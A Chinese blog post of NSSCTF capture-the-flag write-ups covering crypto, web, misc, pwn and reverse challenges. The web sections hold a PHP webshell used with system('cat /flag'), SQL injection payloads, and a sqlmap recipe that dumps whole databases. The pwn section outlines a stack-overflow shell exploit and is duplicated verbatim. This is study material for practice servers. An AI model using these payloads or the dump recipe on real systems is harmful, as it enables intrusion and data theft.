---
title: NSSCTF五题积累（七）
permalink: /2026/03/15/Capture_The_Flag_夺旗赛/夺旗赛Write-up/NSSCTF五题积累（七）/
date: 2026-03-15 13:28:20
categories:
  - Capture_The_Flag_夺旗赛
  - 夺旗赛Write-up
  - NSSCTF
tags:
  - CTF
  - WriteUp
  - NSSCTF
  - 五题积累
created: 2026-03-15T16:49
updated: 2026-05-04T11:06
---

# 第一轮
## 1.Crypto

### [BJDCTF 2020]encode
#### #Base64 #RC4 #XOR
**附件：**

![](<2025 NSSCTF/file-20260331130227858.png>)

![](<2025 NSSCTF/file-20260331130227868.png>)拿到题目首先upx脱壳。再ida32分析：

![](<2025 NSSCTF/file-20260331130227877.png>)

![](<2025 NSSCTF/file-20260331130227886.png>)

```python
int sub_804887C()
{
  int v0; // eax
  int result; // eax
  unsigned int i; // [esp+Ch] [ebp-FCh]
  unsigned int v3; // [esp+10h] [ebp-F8h]
  unsigned int v4; // [esp+14h] [ebp-F4h]
  char v5[48]; // [esp+1Ah] [ebp-EEh] BYREF
  char v6[178]; // [esp+4Ah] [ebp-BEh] BYREF
  unsigned int v7; // [esp+FCh] [ebp-Ch]

  v7 = __readgsdword(0x14u);
  strcpy(v5, "Flag{This_a_Flag}");
  v3 = sub_805BBD0(v5);
  strcpy(v6, "E8D8BD91871A1E56F53F4889682F96142AF2AB8FED7ACFD5E");
  sub_804F950("Please input your flag:");
  sub_806DA80(0, &v6[50], 256);
  if ( sub_805BBD0(&v6[50]) != 21 )
    sub_804EAF0(0);
  v0 = sub_8048AC2(&v6[50]);
  sub_80481D0(&v5[18], v0);
  v4 = sub_805BBD0(&v5[18]);
  for ( i = 0; i < v4; ++i )
    v5[i + 18] ^= v5[i % v3];
  sub_8048E24(&v5[18], v4, v5, v3);
  if ( !sub_8048280(&v5[18], v6) )
    sub_804EAF0(0);
  sub_804F950("right!");
  result = 0;
  if ( __readgsdword(0x14u) != v7 )
    sub_806FA00();
  return result;
```

## 2.Web

### [SWPUCTF 2021 新生赛]caidao
#### #RCEPHP #信息收集
![](<2025 NSSCTF/file-20260331130228263.png>)

法一：打开网页看到一句话木马命令（想到中国蚁剑）

![](<2025 NSSCTF/file-20260331130228242.png>)

![](<2025 NSSCTF/file-20260331130228233.png>)

退到最外层，直接找到flag

![](<2025 NSSCTF/file-20260331130228224.png>)

NSSCTF{62487fd7-b969-4456-a318-f777ccbb1cc1}

法二：Hackbar，根据页面提示使用POST方式以wllm为参传值；  
先传入system("ls /");查出根目录下有flag文件；在传入system("cat /flag");查看flag。

`**wllm=system("ls /");**`

![](<2025 NSSCTF/file-20260331130228135.png>)

`wllm=system('cat /flag');`

![](<2025 NSSCTF/file-20260331130228145.png>)

NSSCTF{71963bd4-678f-4d99-96d5-4c9fba40ad5e}

法三：Burpsuite

Repeater把GET改为POST，右侧Inspector添加请求主体参数。

![](<2025 NSSCTF/file-20260331130228125.png>)

发送查看响应：

![](<2025 NSSCTF/file-20260331130228116.png>)

![](<2025 NSSCTF/file-20260331130228108.png>)

NSSCTF{71963bd4-678f-4d99-96d5-4c9fba40ad5e}

## 3.Misc

### [NSSRound#V Team]画出一个flag
#### #LSB #MISC #图片隐写
![](<2025 NSSCTF/file-20260331130228213.png>)

![](<2025 NSSCTF/file-20260331130228195.png>)

翻了一下，无特别的信息。

使用Stegsolve查看LSB

![](<2025 NSSCTF/file-20260331130228163.png>)

保存为zip，解压出一个flag.dat

根据题目名提示flag是画出来的。于是尝试base64解码后转为01字符串：

```python
import base64
with open('C:/Users/glj07/Desktop/flag.dat', 'rb') as file:
    encoded_data = file.read()
decoded_data = base64.b64decode(encoded_data)
binary_string=''.join(format(byte,'08b')for byte in decoded_data)
with open('flag.txt', 'w', encoding='utf-8') as f:
    f.write(binary_string)
```

缩小看的确暗藏玄机。

![](<2025 NSSCTF/file-20260331130228204.png>)

需要不断调整窗口比例和缩放比例，直至能辨认无误。看得那叫一个老眼昏花。

![](<2025 NSSCTF/file-20260331130228154.png>)

这样不错，最清楚了

NSSCTF{!!Draw_draw_A_flag!!}

## 4.Pwn

### [WUSTCTF 2020]getshell2 
#### #栈溢出 #ret2syscall #栈
附件：service

题目环境：

直接file+checksec

![](<2025 NSSCTF/file-20260331130228790.png>)

只开启了栈不可执行，应该是栈溢出题目。

使用ROPgadget

![](<2025 NSSCTF/file-20260331130228771.png>)

找到了sh地址：0x08048670 

直接写死：sh_addr = 0x08048670

![](<2025 NSSCTF/file-20260331130228763.png>)





栈溢出（Stack Overflow） 漏洞：

+ 程序执行完一个函数后，会跳回它被调用的地方，即返回地址（存于栈上）
+ 当攻击者输入超长数据后,会覆盖返回地址（Return Address）

![](<2025 NSSCTF/file-20260331130228754.png>)

+ `gets()`、`strcpy()` 等属于没有边界检查的函数。

🛠️ 六、完整攻击流程

1. **连接远程服务**
2. **p = remote('ip', port)**

**构造 payload**

    - 填充 28 字节到返回地址位置
    - 覆盖返回地址为 `system`
    - 提供 fake return 和 `"sh"` 地址
3. **发送 payload**

```plain
Python

编辑


1p.sendline(payload)
```

4. **进入交互模式，输入命令**

```plain
Python

编辑


1p.interactive()  # 之后你就可以输入 ls, cat flag.txt 等
```

Q1: 为什么不用 `"/bin/sh"`，而用 `"sh"`？

很多题目为了简化，只放了 `"sh"`。

在 Linux 中，`system("sh")` 和 `system("/bin/sh")` 效果几乎一样，都能弹 shell。

Q2: `0xdeadbeef` 是什么？会 crash 吗？

它只是一个“占位符”，表示“随便填个地址”。

只要你在 `system` 返回前已经拿到 shell，程序是否 crash 都不影响你读 flag。

Q3: 为什么偏移是 28（0x18+4）？

`0x18 = 24` 字节是 buffer 大小

`+4` 是 saved ebp（旧的栈基址指针）

总共 28 字节后，才是返回地址

## 5.Reverse

### [BJDCTF_2020]Easy

附件：easy.exe

无壳程序，直接分析即可

![](<2025 NSSCTF/file-20260331130230842.png>)


# 第二轮
## 1.Crypto

### [CryptoCTF_2020]One_Line_Crypto

![](<2025 NSSCTF/file-20260331130230861.png>)

```python
from Crypto.Util.number import *
from secret import m, n, x, y, flag

p, q = x**(m+1) - (x+1)**m, y**(n+1) - (y+1)**n
assert isPrime(p) and isPrime(q) and p < q < p << 3 and len(bin(p*q)[2:]) == 2048
enc = bytes_to_long(flag)
print(pow(enc, 0x10001, p*q))
```

enc文件：14608474132952352328897080717325464308438322623319847428447933943202421270837793998477083014291941466731019653023483491235062655934244065705032549531016125948268383108879698723118735440224501070612559381488973867339949208410120554358243554988690125725017934324313420395669218392736333195595568629468510362825066512708008360268113724800748727389663826686526781051838485024304995256341660882888351454147057956887890382690983135114799585596506505555357140161761871724188274546128208872045878153092716215744912986603891814964771125466939491888724521626291403272010814738087901173244711311698792435222513388474103420001421

## 2.Web

### [第五空间 2021]WebFTP
#### #目录扫描 #信息收集 #.git泄露
![](<2025 NSSCTF/file-20260331130228045.png>)

使用御剑工具扫描，发现大量域名

![](<2025 NSSCTF/file-20260331130227997.png>)

![](<2025 NSSCTF/file-20260331130228026.png>)![](<2025 NSSCTF/file-20260331130228006.png>)

NSSCTF{f632d0a0-0321-4df6-b3b7-fae9e4c0b269}



**Robots**

昨天十三年社团讲课，讲了Robots.txt的作用，小刚上课没有认真听课正在着急，你能不能帮帮忙

![](<2025 NSSCTF/file-20260331130227988.png>)

![](<2025 NSSCTF/file-20260331130227970.png>)

flag{29d2b23a9f2145888d1f8c76e2b4a8b4}



[SWPUCTF 2021 新生赛]easy_sql

SQL注入报错注入布尔盲注

  第一步：信息收集（基础侦察）

  目标： 确认目标可达，收集基本信息

`curl -I "http://node4.anna.nssctf.cn:24443/"`

![](<2025 NSSCTF/file-20260331130227979.png>)

看什么：

+ HTTP状态码：200 OK（目标存活）
+ Server：nginx/1.14.2（Web服务器信息）
+ X-Powered-By：PHP/5.6.40（后端语言，老版本可能有漏洞）

 经验： curl -I 比直接访问页面更快，只看头部信息，不下载内容！

第二步：分析页面，找参数

  目标： 找到可能存在SQL注入的参数

`curl -s "http://node4.anna.nssctf.cn:24443/"`

![](<2025 NSSCTF/file-20260331130227960.png>)

Ctrl+U查看源代码也可

![](<2025 NSSCTF/file-20260331130227941.png>)

观察结果：

+ 页面标题："参数是 wllm" ← 重要线索！
+ 页面内容："球球你输入点东西吧！" ← 说明需要输入参数

推理： 存在一个叫 wllm 的GET参数

  测试参数：

`curl -s "http://node4.anna.nssctf.cn:24443/?wllm=test"`

![](<2025 NSSCTF/file-20260331130227951.png>)

先用普通值测试参数是否被处理，页面变化=参数有效

  第三步：确认SQL注入漏洞

  目标： 验证是否存在SQL注入

`curl -s "http://node4.anna.nssctf.cn:24443/?wllm=test"`

  观察什么：  
  如果看到SQL错误信息，说明存在注入！比如：  
  You have an error in your SQL syntax...

经验： 单引号 ' 是最简单的SQL注入测试字符，能快速暴露漏洞！

 

 第四步：SQLMap自动化攻击

  现在开始真正使用SQLMap！

  4.1 基础扫描（找注入点）

  命令：  
`sqlmap -u "http://node4.anna.nssctf.cn:24443/?wllm=1" --batch`

  参数解释：

+ -u：目标URL
+ ?wllm=1：给参数一个普通值
+ --batch：自动选择，不问问题

  看什么：  
  SQLMap会告诉你：

+ 注入类型（Boolean、Time、Error等）
+ 注入技术（UNION、Boolean等）

![](<2025 NSSCTF/file-20260331130227933.png>)

数据库信息：back-end DBMS: MySQL >= 5.0 (MariaDB fork)  
  web application technology: Nginx 1.14.2, PHP 5.6.40

意思是：

+ 数据库：MySQL 5.0以上版本,MariaDB分支
+ Web服务器：Nginx 1.14.2
+ 后端语言：PHP 5.6.40

  SQLMap找到了4种注入方式：

1. Boolean-based blind（布尔盲注）

  Payload: wllm=1' AND 5235=5235 AND 'aqWL'='aqWL  
  原理： 通过True/False判断来获取信息  
  特点： 速度慢，但很稳定

2. Error-based（报错注入） ⭐推荐

  Payload: wllm=1' AND (SELECT 9989 FROM(SELECT COUNT(*),CONCAT(...))x...  
  原理： 让数据库报错，在错误信息中显示数据  
  特点： 速度快！一次性获取大量信息

3. Time-based blind（时间盲注）

  Payload: wllm=1' AND (SELECT 7527 FROM (SELECT(SLEEP(5)))esur)...  
  原理： 通过延时来判断True/False  
  特点： 最慢，但最通用

4. UNION query（联合查询注入） ⭐推荐

  Payload: wllm=-4242' UNION ALL SELECT NULL,NULL,CONCAT(...)-- -  
  原理： 通过UNION合并查询直接显示数据  
  特点： 最快！最直接！



4.2 枚举数据库

  命令：  
 `sqlmap -u "http://node4.anna.nssctf.cn:24443/?wllm=1" --batch --dbs`

  参数解释：

+ --dbs：列出所有数据库

![](<2025 NSSCTF/file-20260331130227915.png>)

 test_db    ← 这个看起来可疑！

  本小姐的观察技巧： test_db 明显不是默认数据库，肯定是放flag的地方！

  4.3 枚举表  
`sqlmap -u "http://node4.anna.nssctf.cn:24443/?wllm=1" --batch -D test_db --tables`

  新增参数：

+ -D test_db：指定数据库
+ --tables：列出该数据库的所有表

![](<2025 NSSCTF/file-20260331130227924.png>)

  4.4 查看表结构

`sqlmap -u "http://node4.anna.nssctf.cn:24443/?wllm=1" --batch -D test_db -T test_tb --columns`

  新增参数：

+ -T test_tb：指定表
+ --columns：查看表结构

![](<2025 NSSCTF/file-20260331130227905.png>)

  4.5 获取FLAG！

  最后一步：  
sqlmap -u "http://node4.anna.nssctf.cn:24443/?wllm=1" --batch -D test_db -T test_tb --dump

  新增参数：

+ --dump：导出表中的所有数据

![](<2025 NSSCTF/file-20260331130227896.png>)

NSSCTF{ecd98b8f-2324-48e6-9785-0b5ec164a0ee}

  🧠 SQLMap使用思路总结

  核心思路流程：

1. 信息收集 → 2. 找参数 → 3. 确认注入 → 4. SQLMap自动化

  SQLMap标准流程：

  找注入点 → 枚举数据库 → 枚举表 → 查看结构 → 导出数据

  常用命令组合：

# 基础测试
sqlmap -u "URL?param=1" --batch

# 找数据库
sqlmap -u "URL?param=1" --batch --dbs

# 找表
sqlmap -u "URL?param=1" --batch -D dbname --tables

# 看结构
sqlmap -u "URL?param=1" --batch -D dbname -T tablename --columns

# 获取数据
sqlmap -u "URL?param=1" --batch -D dbname -T tablename --dump





1. 快速判断目标：
+ 看到"参数是xxx" → 直接用那个参数名
+ 页面简单 → 通常是入门级SQL注入
2. SQLMap参数优先级：
+ --batch：永远加上，省去手动选择
+ --dbs → --tables → --columns → --dump：标准流程
3. 数据库命名规律：
+ test_db, flag_db, challenge_db：90%放flag
+ information_schema, mysql：系统数据库，不用看
4. 表名规律：
+ flag, test_tb, admin：重点关注的表
+ users：通常放用户信息，可能有flag
5. 避坑指南：
+ 用curl -I先测试连通性，避免SQLMap卡死
+ 看到--batch参数，SQLMap就不会一直问问题
+ 如果SQLMap卡住，用--timeout=10限制时间

---

  遇到问题时：

+ SQLMap报错 → 检查URL是否正确
+ 找不到数据库 → 可能权限不够或注入点错误
+ 卡住不动 → 加--timeout参数

## 3.Misc

### [陇剑杯_2021]签到

> 题目描述：
>
> 此时正在进行的可能是__________协议的网络攻击。（如有字母请全部使用小写，填写样例：http、dns、ftp）。得到的flag请使用NSSCTF{}格式提交。
>

![](<2025 NSSCTF/file-20260331130230769.png>)

NSSCTF{http}

## 4.Pwn

### [WUSTCTF 2020]getshell2 
#### #栈溢出 #ret2syscall #栈
附件：service

题目环境：

直接file+checksec

![](<2025 NSSCTF/file-20260331130228790.png>)

只开启了栈不可执行，应该是栈溢出题目。

使用ROPgadget

![](<2025 NSSCTF/file-20260331130228771.png>)

找到了sh地址：0x08048670 

直接写死：sh_addr = 0x08048670

![](<2025 NSSCTF/file-20260331130228763.png>)





栈溢出（Stack Overflow） 漏洞：

+ 程序执行完一个函数后，会跳回它被调用的地方，即返回地址（存于栈上）
+ 当攻击者输入超长数据后,会覆盖返回地址（Return Address）

![](<2025 NSSCTF/file-20260331130228754.png>)

+ `gets()`、`strcpy()` 等属于没有边界检查的函数。

🛠️ 六、完整攻击流程

1. **连接远程服务**
2. **p = remote('ip', port)**

**构造 payload**

    - 填充 28 字节到返回地址位置
    - 覆盖返回地址为 `system`
    - 提供 fake return 和 `"sh"` 地址
3. **发送 payload**

```plain
Python

编辑


1p.sendline(payload)
```

4. **进入交互模式，输入命令**

```plain
Python

编辑


1p.interactive()  # 之后你就可以输入 ls, cat flag.txt 等
```

Q1: 为什么不用 `"/bin/sh"`，而用 `"sh"`？

很多题目为了简化，只放了 `"sh"`。

在 Linux 中，`system("sh")` 和 `system("/bin/sh")` 效果几乎一样，都能弹 shell。

Q2: `0xdeadbeef` 是什么？会 crash 吗？

它只是一个“占位符”，表示“随便填个地址”。

只要你在 `system` 返回前已经拿到 shell，程序是否 crash 都不影响你读 flag。

Q3: 为什么偏移是 28（0x18+4）？

`0x18 = 24` 字节是 buffer 大小

`+4` 是 saved ebp（旧的栈基址指针）

总共 28 字节后，才是返回地址

## 5.Reverse

### [SEETF 2022]Magic 
#### #反调试 #REVERSE
题目描述：There might be a hidden gate to the magical land of flags...

![](<2025 NSSCTF/file-20260331130228709.png>)

默认值：

![](<2025 NSSCTF/file-20260331130228691.png>)

```plain
int __cdecl __noreturn main(int argc, const char **argv, const char **envp)
{
  _OWORD v3[2]; // [esp-C0h] [ebp-CCh] BYREF
  __int64 v4; // [esp-A0h] [ebp-ACh]
  int v5; // [esp-98h] [ebp-A4h]
  char v6[3]; // [esp-94h] [ebp-A0h] BYREF
  int v7; // [esp+4h] [ebp-8h]
  int retaddr; // [esp+Ch] [ebp+0h]

  v7 = retaddr;
  v5 = 1725917800;
  v3[0] = xmmword_403148;
  strcpy(v6, "h6");
  v3[1] = xmmword_403158;
  v4 = 0x7CE4457476DB4268i64;
  ((void (__thiscall __noreturn *)(_OWORD *))sub_401290)(v3);
```

重新用ida32打开magic.exe，进入`内核选项 kernel options`，**取消勾选** `进行"无返回"分析 perform no-return analysis`，这样分析`main` 函数内容会更完整。  ![](<2025 NSSCTF/file-20260331130228673.png>)

操作后：

```plain
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int v3; // ebp
  char v4; // di
  int v5; // ecx
  FILE *v6; // eax
  int i; // edi
  DWORD TickCount; // eax
  HKEY v10; // [esp-13Ch] [ebp-148h] BYREF
  DWORD v11; // [esp-138h] [ebp-144h] BYREF
  __int16 v12; // [esp-134h] [ebp-140h]
  _OWORD v13[4]; // [esp-130h] [ebp-13Ch] BYREF
  char v14[24]; // [esp-F0h] [ebp-FCh] BYREF
  BYTE v15[24]; // [esp-D8h] [ebp-E4h] BYREF
  _OWORD v16[2]; // [esp-C0h] [ebp-CCh] BYREF
  __int64 v17; // [esp-A0h] [ebp-ACh]
  int v18; // [esp-98h] [ebp-A4h]
  char v19[3]; // [esp-94h] [ebp-A0h] BYREF
  _OWORD v20[2]; // [esp-90h] [ebp-9Ch] BYREF
  __int16 v21; // [esp-70h] [ebp-7Ch]
  char v22; // [esp-6Eh] [ebp-7Ah]
  _OWORD v23[2]; // [esp-54h] [ebp-60h] BYREF
  __int16 v24; // [esp-34h] [ebp-40h]
  __int128 v25; // [esp-30h] [ebp-3Ch] BYREF
  int v26; // [esp-20h] [ebp-2Ch]
  char v27; // [esp-1Ch] [ebp-28h]
  char v28[12]; // [esp-18h] [ebp-24h] BYREF
  int v29; // [esp-Ch] [ebp-18h] BYREF
  __int16 v30; // [esp-8h] [ebp-14h]
  int v31; // [esp+0h] [ebp-Ch]
  int v32; // [esp+4h] [ebp-8h]
  int retaddr; // [esp+Ch] [ebp+0h]

  v31 = v3;
  v32 = retaddr;
  v18 = 1725917800;
  v16[0] = xmmword_403148;
  strcpy(v19, "h6");
  v16[1] = xmmword_403158;
  v17 = 0x7CE4457476DB4268i64;
  sub_401290(v16);
  RegOpenKeyExA(HKEY_LOCAL_MACHINE, (LPCSTR)v16, 0, 0x101u, &v10);
  v29 = 1741189973;
  v30 = 96;
  sub_401290(&v29);
  v11 = 21;
  if ( RegQueryValueExA(v10, (LPCSTR)&v29, 0, 0, v15, &v11) )
    return -1;
  v12 = 20;
  sub_401170(v14);
  v26 = -405287383;
  v25 = xmmword_4031F0;
  v27 = 0;
  if ( strncmp(v14, (const char *)&v25, 0x14u) )
    return -1;
  v13[0] = xmmword_4031B0;
  v13[1] = xmmword_4031D0;
  v13[2] = xmmword_4031C0;
  v13[3] = xmmword_4031E0;
  sub_4012F0(v13, v15, v5);
  sub_4011D0("%s", (char)v13);
  v6 = _acrt_iob_func(0);
  fgets(v28, 9, v6);
  if ( !atoi(v28) )
  {
    sub_4011D0("nope", v4);
    return -1;
  }
  if ( sub_401360(v28) == -1339812568 )
  {
    if ( IsDebuggerPresent() )
      goto LABEL_13;
    v21 = 5692;
    v20[0] = xmmword_40318C;
    v22 = 0;
    v20[1] = xmmword_40319C;
    sub_401290(v20);
    sub_4011D0("%s", (char)v20);
    for ( i = 0; i < 8; ++i )
    {
      TickCount = GetTickCount();
      v28[i] -= 10;
      if ( GetTickCount() - TickCount > 0x5DC )
        goto LABEL_13;
    }
    v23[0] = xmmword_403200;
    v23[1] = xmmword_403210;
    v24 = -10010;
    sub_401170(v23);
    if ( IsDebuggerPresent() )
LABEL_13:
      ExitProcess(0xFFFFFFFF);
    sub_4011D0("%s", (char)v23);
    return 0;
  }
  else
  {
    sub_4011D0("nope", v4);
    return 0;
  }
}
```

原因：

部分函数直接调用 `ExitProcess` 退出而不返回，以阻碍动调。ida识别后认为是结束点，就不分析 `main` 函数剩下的代码了。



# 补充题

这两题来自旧总文中结构错位或孤立残段。为了不漏题，先并入本篇补充区，后续若再凑满一轮可单独迁出。

## Crypto补充

### [鹤城杯 2021]A_CRYPTO
#Base家族 #ROT #古典密码

> 4O595954494Q32515046324757595N534R52415653334357474R4N575955544R4O5N4Q46434S4O59474253464Q5N444R4Q51334557524O5N4S424944473542554O595N44534O324R49565746515532464O49345649564O464R4R494543504N35
>

这题只有一种方法：ciphey一把梭，否则是无法按常理做出来的。

![](<2025 NSSCTF/file-20260331130228464.png>)flag{W0w_y0u_c4n_rea11y_enc0d1ng!}


## Web补充

### [SUCTF 2019]EasySQL
#### #SQL注入 #堆叠注入 #后端逻辑分析
题目地址：http://node4.anna.nssctf.cn:27612/

#### 题目分析
这是一道经典的SQL注入题目，题目提示我们输入flag，它会告诉我们是否正确。

首先，观察到页面只有一个输入框，我们可以输入数据，然后点击提交。

#### 解题思路
这道题的关键在于猜测后端的SQL逻辑。通过搜索这道题的背景信息，我们可以知道这道题的后端逻辑大致如下：

```php
$sql = "select " . $_POST['输入内容'] . " || flag from Flag";
```

这里的 `||` 在 MySQL 中是逻辑或运算符。当我们输入某些特定内容时，可以触发一些有趣的效果。

#### 非预期解法（最简单）
输入 payload: `*,1`

原理：
- 当我们输入 `*,1` 时，后端的SQL语句变成：`select *,1 || flag from Flag`
- 由于 MySQL 解析的优先级，`*,1` 会被优先解析，变成：`select *,1 from Flag`
- 这样就可以成功查询到 Flag 表的所有内容

最终得到的 flag：
`NSSCTF{e1f5b83a-7d3f-4493-9041-dd725742be32}`

#### 另一种解法
使用 payload: `1;set sql_mode=pipes_as_concat;select 1`

原理：
- 通过堆叠注入，我们设置 sql_mode 为 pipes_as_concat
- 这样 || 符号就从逻辑或变成了字符串连接符
- 然后再查询就可以得到 flag 了

#### 关于使用 sqlmap
本机 WSL 环境有 `/usr/local/bin/sqlmap` 可以使用。不过，对于这道题来说，直接使用手工 payload 更加高效快捷，因为它主要是依赖对后端逻辑的猜测，而不是常规的 SQL 注入流程。






